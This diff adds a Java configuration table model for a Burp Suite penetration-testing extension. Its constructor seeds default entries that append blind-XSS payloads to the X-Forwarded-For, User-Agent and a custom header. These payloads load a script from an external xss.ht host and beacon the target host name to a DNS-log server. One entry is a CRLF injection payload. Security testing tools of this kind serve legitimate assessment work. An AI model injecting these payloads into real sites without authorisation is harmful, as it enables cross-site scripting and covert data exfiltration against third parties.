@@ -1,0 +1,187 @@
+package config;
+
+import javax.swing.table.AbstractTableModel;
+import burp.BurpExtender;
+import java.util.*;
+
+
+public class ConfigTableModel extends AbstractTableModel{
+	//https://stackoverflow.com/questions/11553426/error-in-getrowcount-on-defaulttablemodel
+	//when use DefaultTableModel, getRowCount encounter NullPointerException. why?
+    /**
+	 * LineTableModel中数据如果类型不匹配，或者有其他问题，可能导致图形界面加载异常！
+	 */
+	private static final long serialVersionUID = 1L;
+    private List<ConfigEntry> configEntries =new ArrayList<ConfigEntry>();
+
+    private BurpExtender burp;
+    private static final String[] titles = new String[] {
+    		"Key", "Value", "Type", "Enable"
+    	};
+
+    public ConfigTableModel(final BurpExtender burp){
+        this.burp = burp;
+        
+        configEntries.add(new ConfigEntry("DNSlogServer", "bit.0y0.link",ConfigEntry.Config_Basic_Variable,true));
+		configEntries.add(new ConfigEntry("browserPath", "C:\\Program Files\\Mozilla Firefox\\firefox.exe",ConfigEntry.Config_Basic_Variable,true));
+		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true));
+		
+		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true));
+		configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true));
+		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true));
+		
+		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"/><script src=https://bmw.xss.ht></script>",ConfigEntry.Action_Add_Or_Replace_Header,true));
+		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>",ConfigEntry.Action_Append_To_header_value,true));
+		configEntries.add(new ConfigEntry("bit4woo", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
+		
+		configEntries.add(new ConfigEntry("CRLF", "//%0d%0a/http://www.baidu.com/bit4",ConfigEntry.Config_Custom_Payload,true));
+
+    }
+   
+	
+	public List<String> getConfigJsons(){
+		List<String> result = new ArrayList<String>();
+		for(ConfigEntry line:configEntries) {
+			String linetext = line.ToJson();
+			result.add(linetext);
+		}
+		return result;
+	}
+	
+	
+	public List<ConfigEntry> getConfigByType(String type) {
+		
+		List<ConfigEntry> result = new ArrayList<ConfigEntry>();
+		for (ConfigEntry entry:configEntries) {
+			if (entry.getType().equals(type) && entry.isEnable()) {
+				result.add(entry);
+			}
+		}
+		return result;
+	}
+	
+	
+	public String getConfigByKey(String key) {
+		for (ConfigEntry entry:configEntries) {
+			if (entry.getKey().equals(key) && entry.isEnable()) {
+				return entry.getValue();
+			}
+		}
+		return null;
+	}
+	
+    
+    ////////////////////// extend AbstractTableModel////////////////////////////////
+
+    @Override
+    public int getColumnCount()
+    {
+        return titles.length;
+    }
+
+    @Override
+    public Class<?> getColumnClass(int columnIndex)
+    {	switch(columnIndex) 
+    	{
+    	case 3: 
+    		return boolean.class;//enable
+    	default:
+    		return String.class;
+    	}
+
+    }
+
+    @Override
+    public int getRowCount()
+    {
+        return configEntries.size();
+    }
+    
+    //define header of table???
+    @Override
+    public String getColumnName(int columnIndex) {
+		if (columnIndex >= 0 && columnIndex <= titles.length) {
+			return titles[columnIndex];
+		}else {
+			return "";
+		}
+    }
+
+    @Override
+    public boolean isCellEditable(int rowIndex, int columnIndex) {
+        return false;
+    }
+    
+    public void removeRows(int[] rows) {
+        synchronized (configEntries) {
+        	//because thread let the delete action not in order, so we must loop in here.
+        	//list length and index changed after every remove.the origin index not point to right item any more.
+        	Arrays.sort(rows); //升序
+        	for (int i=rows.length-1;i>=0 ;i-- ) {//降序删除才能正确删除每个元素
+        		String key = configEntries.get(rows[i]).getKey();
+        		configEntries.remove(rows[i]);
+            	this.burp.stdout.println("!!! "+key+" deleted");
+                this.fireTableRowsDeleted(rows[i], rows[i]);
+        	}
+        }
+    }
+
+    
+    public void updateRows(int[] rows) {
+        synchronized (configEntries) {
+        	//because thread let the delete action not in order, so we must loop in here.
+        	//list length and index changed after every remove.the origin index not point to right item any more.
+        	Arrays.sort(rows); //升序
+        	for (int i=rows.length-1;i>=0 ;i-- ) {//降序删除才能正确删除每个元素
+        		ConfigEntry checked = configEntries.get(rows[i]);
+        		configEntries.remove(rows[i]);
+        		configEntries.add(rows[i], checked);
+        	}
+        	this.fireTableRowsUpdated(rows[0], rows[rows.length-1]);
+        }
+    }
+    
+    @Override
+    public Object getValueAt(int rowIndex, int columnIndex)
+    {
+        ConfigEntry entry = configEntries.get(rowIndex);
+        switch (columnIndex)
+        {
+            case 0:
+                return entry.getKey();
+            case 1:
+                return entry.getValue();
+            case 2:
+                return entry.getType();
+            case 3:
+                return entry.isEnable();
+            default:
+                return "";
+        }
+    }
+    
+    //////////////////////extend AbstractTableModel////////////////////////////////
+
+    public void addNewConfigEntry(ConfigEntry lineEntry){
+        synchronized (configEntries) {
+        	configEntries.add(lineEntry);
+            int row = configEntries.size();
+            //fireTableRowsInserted(row, row);
+            //need to use row-1 when add setRowSorter to table. why??
+            //https://stackoverflow.com/questions/6165060/after-adding-a-tablerowsorter-adding-values-to-model-cause-java-lang-indexoutofb
+            //fireTableRowsInserted(row-1, row-1);
+			fireTableRowsInserted(row, row);
+			row = configEntries.size();
+        }
+    }
+
+
+	public List<ConfigEntry> getConfigEntries() {
+		return configEntries;
+	}
+
+
+	public void setConfigEntries(List<ConfigEntry> configEntries) {
+		this.configEntries = configEntries;
+	}
+}
